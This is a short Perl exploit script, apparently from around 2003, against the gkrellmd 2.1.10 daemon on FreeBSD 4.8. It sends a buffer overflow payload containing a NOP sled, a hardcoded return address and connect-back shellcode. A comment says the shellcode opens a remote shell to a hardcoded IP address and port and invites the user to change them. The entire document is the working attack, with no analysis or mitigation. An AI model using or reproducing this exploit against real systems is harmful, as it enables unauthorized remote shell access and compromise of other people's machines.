#!/usr/bin/perl -s
# kokaninATdtors.net playing with gkrellmd on FreeBSD 4.8-RELEASE
# advisory on http://packetstormsecurity.nl/0306-exploits/gkrellmd
# I just ripped their code and made it do something useful instead
# shellcode by bighawk(i think) - wow this is badly formatted.

use IO::Socket;
if(!$ARGV[0] || !$ARGV[1])
{ print "usage: ./DSR-geekrellm.pl <host> <port> (default gkrellmd is 19150)\n"; exit(-1); }

$host = $ARGV[0];
$port = $ARGV[1];
$ret = pack("l",0xbfbffa60);
$shellcode = "\x31\xc9\xf7\xe1\x51\x41\x51\x41\x51\x51\xb0\x61\xcd\x80\x89\xc3\x68\xd9\x9d\x26\x26\x66\x68\x27\x10\x66\x51\x89\xe6\xb2\x10\x52\x56\x50\x50\xb0\x62\xcd\x80\x41\xb0\x5a\x49\x51\x53\x53\xcd\x80\x41\xe2\xf5\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x54\x53\x53\xb0\x3b\xcd\x80";
#--> connect-back to a useless ip, change it:)                                     ^^217.157.38.38^        ^^10000^
$nop = "\x90";
$buf = "A" x 128 . $ret x 2 . $nop x 500 . $shellcode;

$socket = new IO::Socket::INET
(
Proto    => "tcp",
PeerAddr => $host,
PeerPort => $port,
);

die "unable to connect to $host:$port ($!)\n" unless $socket;

print $socket "gkrellm 2.1.10\n"; #tell the daemon wich client we have
sleep(1); #might have to adjust this on slow connections
print $socket $buf;

close($socket);

